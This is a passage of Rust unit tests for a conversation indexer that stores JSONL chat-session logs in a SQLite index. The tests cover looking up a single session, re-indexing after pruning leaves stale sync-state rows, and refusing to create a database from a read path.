            format!(
                "{}\n",
                format_args!(
                    r#"{{"uuid":"p1","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"user","content":"only message"}}}}"#
                )
            ),
        )
        .unwrap();

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();
        ConversationIndexer::new(db_path, true).unwrap();

        let tree = lookup_tree(db_path, "abcdef01", Some(&roots)).unwrap();
        assert!(tree.error.is_none(), "unexpected error: {:?}", tree.error);
        assert_eq!(tree.total_messages, 1);
    }

    /// `prune-observer` (and any interrupted run) can leave a `claude_code_sync_state` row
    /// behind with no conversation rows. Without `set_force`, the mtime check would then
    /// short-circuit the re-read and the retry would be a silent no-op.
    #[test]
    fn reindexes_a_session_whose_sync_state_outlived_its_rows() {
        let home = tempfile::tempdir().unwrap();
        let roots = vec![home.path().join("projects")];
        let project = roots[0].join("-tmp-someproject");
        std::fs::create_dir_all(&project).unwrap();

        let session = "feedface-9999-8888-7777-666666666666";
        let file = project.join(format!("{}.jsonl", session));
        std::fs::write(
            &file,
            format!(
                "{}\n",
                format_args!(
                    r#"{{"uuid":"s1","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{session}","cwd":"/tmp/someproject","message":{{"role":"user","content":"still recoverable"}}}}"#
                )
            ),
        )
        .unwrap();

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();

        let mut indexer = ConversationIndexer::new(db_path, true).unwrap();
        indexer.index_conversation(&file).unwrap();
        // Drop the content but keep sync_state, exactly what prune leaves behind.
        indexer
            .connection()
            .execute_batch("DELETE FROM messages; DELETE FROM conversations;")
            .unwrap();
        let stamped: i64 = indexer
            .connection()
            .query_row("SELECT COUNT(*) FROM claude_code_sync_state", [], |r| {
                r.get(0)
            })
            .unwrap();
        assert_eq!(stamped, 1, "precondition: the file is still stamped");
        drop(indexer);

        let tree = lookup_tree(db_path, session, Some(&roots)).unwrap();
        assert!(tree.error.is_none(), "unexpected error: {:?}", tree.error);
        assert_eq!(tree.total_messages, 1);
    }

    #[test]
    fn refuses_to_create_a_database_from_a_read_path() {
        let dir = tempfile::tempdir().unwrap();
        let missing = dir.path().join("absent.db");
        assert!(!index_single_session(
            missing.to_str().unwrap(),
            "deadbeef-1111-2222-3333-444444444444",
            None
        ));
        assert!(!missing.exists(), "tree must never build an index database");
    }
}
